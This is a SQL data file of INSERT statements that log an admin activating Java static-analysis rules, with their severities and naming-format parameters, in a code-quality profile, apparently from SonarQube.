INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3824, '2017-11-20 13:05:36.185', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S00107;ruleKey=squid:S00107;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLW5bbGRdfPp-rZU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3825, '2017-11-20 13:05:36.207', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S00108;ruleKey=squid:S00108;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLXPbbGRdfPp-rZV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3826, '2017-11-20 13:05:36.235', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S00112;ruleKey=squid:S00112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLXqbbGRdfPp-rZW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3827, '2017-11-20 13:05:36.263', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S00114;ruleKey=squid:S00114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLYHbbGRdfPp-rZX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3828, '2017-11-20 13:05:36.281', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S00115;ruleKey=squid:S00115;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLYZbbGRdfPp-rZY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3829, '2017-11-20 13:05:36.306', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S00116;ruleKey=squid:S00116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLYybbGRdfPp-rZZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3830, '2017-11-20 13:05:36.334', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S00117;ruleKey=squid:S00117;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLZObbGRdfPp-rZa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3831, '2017-11-20 13:05:36.363', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S00119;ruleKey=squid:S00119;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLZrbbGRdfPp-rZb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3832, '2017-11-20 13:05:36.443', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S00120;ruleKey=squid:S00120;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLa7bbGRdfPp-rZc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3833, '2017-11-20 13:05:36.562', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S106;ruleKey=squid:S106;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLcybbGRdfPp-rZd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3834, '2017-11-20 13:05:36.653', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1065;ruleKey=squid:S1065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLeNbbGRdfPp-rZe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3835, '2017-11-20 13:05:36.699', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1066;ruleKey=squid:S1066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLe7bbGRdfPp-rZf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3836, '2017-11-20 13:05:36.749', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1068;ruleKey=squid:S1068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLftbbGRdfPp-rZg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3837, '2017-11-20 13:05:36.78', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1075;ruleKey=squid:S1075;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLgMbbGRdfPp-rZh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3838, '2017-11-20 13:05:36.814', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1118;ruleKey=squid:S1118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLgubbGRdfPp-rZi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3839, '2017-11-20 13:05:36.856', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1125;ruleKey=squid:S1125;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLhYbbGRdfPp-rZj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3840, '2017-11-20 13:05:36.896', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1126;ruleKey=squid:S1126;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLiAbbGRdfPp-rZk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3841, '2017-11-20 13:05:36.936', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1133;ruleKey=squid:S1133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLiobbGRdfPp-rZl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3842, '2017-11-20 13:05:36.969', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1134;ruleKey=squid:S1134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLjJbbGRdfPp-rZm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3843, '2017-11-20 13:05:37.008', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1135;ruleKey=squid:S1135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLjwbbGRdfPp-rZn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3844, '2017-11-20 13:05:37.053', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1141;ruleKey=squid:S1141;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLkdbbGRdfPp-rZo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3845, '2017-11-20 13:05:37.109', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1143;ruleKey=squid:S1143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLlVbbGRdfPp-rZp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3846, '2017-11-20 13:05:37.195', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1148;ruleKey=squid:S1148;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLmrbbGRdfPp-rZq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3847, '2017-11-20 13:05:37.24', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1149;ruleKey=squid:S1149;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLnYbbGRdfPp-rZr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3848, '2017-11-20 13:05:37.273', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1150;ruleKey=squid:S1150;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLn5bbGRdfPp-rZs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3849, '2017-11-20 13:05:37.303', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1153;ruleKey=squid:S1153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLoXbbGRdfPp-rZt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3850, '2017-11-20 13:05:37.346', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1155;ruleKey=squid:S1155;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLpCbbGRdfPp-rZu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3851, '2017-11-20 13:05:37.4', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1157;ruleKey=squid:S1157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLp4bbGRdfPp-rZv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3852, '2017-11-20 13:05:37.444', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1158;ruleKey=squid:S1158;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLqkbbGRdfPp-rZw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3853, '2017-11-20 13:05:37.486', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1161;ruleKey=squid:S1161;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLrObbGRdfPp-rZx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3854, '2017-11-20 13:05:37.542', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1163;ruleKey=squid:S1163;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLsGbbGRdfPp-rZy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3855, '2017-11-20 13:05:37.598', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1165;ruleKey=squid:S1165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLs-bbGRdfPp-rZz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3856, '2017-11-20 13:05:37.698', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1168;ruleKey=squid:S1168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLuibbGRdfPp-rZ0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3857, '2017-11-20 13:05:37.753', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1170;ruleKey=squid:S1170;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLvZbbGRdfPp-rZ1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3858, '2017-11-20 13:05:37.784', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1171;ruleKey=squid:S1171;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLv4bbGRdfPp-rZ2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3859, '2017-11-20 13:05:37.83', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1172;ruleKey=squid:S1172;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLwmbbGRdfPp-rZ3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3860, '2017-11-20 13:05:37.866', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1174;ruleKey=squid:S1174;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLxKbbGRdfPp-rZ4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3861, '2017-11-20 13:05:37.907', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1175;ruleKey=squid:S1175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLxzbbGRdfPp-rZ5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3862, '2017-11-20 13:05:37.934', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1181;ruleKey=squid:S1181;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLyObbGRdfPp-rZ6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3863, '2017-11-20 13:05:37.963', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1182;ruleKey=squid:S1182;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLyrbbGRdfPp-rZ7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3864, '2017-11-20 13:05:37.983', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1185;ruleKey=squid:S1185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLy_bbGRdfPp-rZ8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3865, '2017-11-20 13:05:38.011', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1186;ruleKey=squid:S1186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLzbbbGRdfPp-rZ9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3866, '2017-11-20 13:05:38.045', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1190;ruleKey=squid:S1190;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiLz9bbGRdfPp-rZ-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3867, '2017-11-20 13:05:38.074', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1191;ruleKey=squid:S1191;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL0abbGRdfPp-rZ_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3868, '2017-11-20 13:05:38.106', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1192;ruleKey=squid:S1192;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL06bbGRdfPp-raA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3869, '2017-11-20 13:05:38.136', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1193;ruleKey=squid:S1193;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL1YbbGRdfPp-raB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3870, '2017-11-20 13:05:38.167', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1195;ruleKey=squid:S1195;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL13bbGRdfPp-raC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3871, '2017-11-20 13:05:38.196', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1197;ruleKey=squid:S1197;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL2UbbGRdfPp-raD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3872, '2017-11-20 13:05:38.226', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1199;ruleKey=squid:S1199;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL2ybbGRdfPp-raE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3873, '2017-11-20 13:05:38.263', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1201;ruleKey=squid:S1201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL3XbbGRdfPp-raF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3874, '2017-11-20 13:05:38.317', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1206;ruleKey=squid:S1206;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL4NbbGRdfPp-raG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3875, '2017-11-20 13:05:38.347', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1210;ruleKey=squid:S1210;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL4rbbGRdfPp-raH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3876, '2017-11-20 13:05:38.384', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1214;ruleKey=squid:S1214;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL5QbbGRdfPp-raI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3877, '2017-11-20 13:05:38.444', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1215;ruleKey=squid:S1215;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL6MbbGRdfPp-raJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3878, '2017-11-20 13:05:38.513', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1217;ruleKey=squid:S1217;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL7RbbGRdfPp-raK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3879, '2017-11-20 13:05:38.554', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1219;ruleKey=squid:S1219;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL76bbGRdfPp-raL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3880, '2017-11-20 13:05:38.625', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1220;ruleKey=squid:S1220;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL9BbbGRdfPp-raM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3881, '2017-11-20 13:05:38.711', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1221;ruleKey=squid:S1221;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL-XbbGRdfPp-raN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3882, '2017-11-20 13:05:38.75', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1223;ruleKey=squid:S1223;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL--bbGRdfPp-raO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3883, '2017-11-20 13:05:38.796', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1226;ruleKey=squid:S1226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiL_sbbGRdfPp-raP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3884, '2017-11-20 13:05:38.836', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S1264;ruleKey=squid:S1264;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMAUbbGRdfPp-raQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3885, '2017-11-20 13:05:38.895', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S128;ruleKey=squid:S128;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiMBPbbGRdfPp-raR');
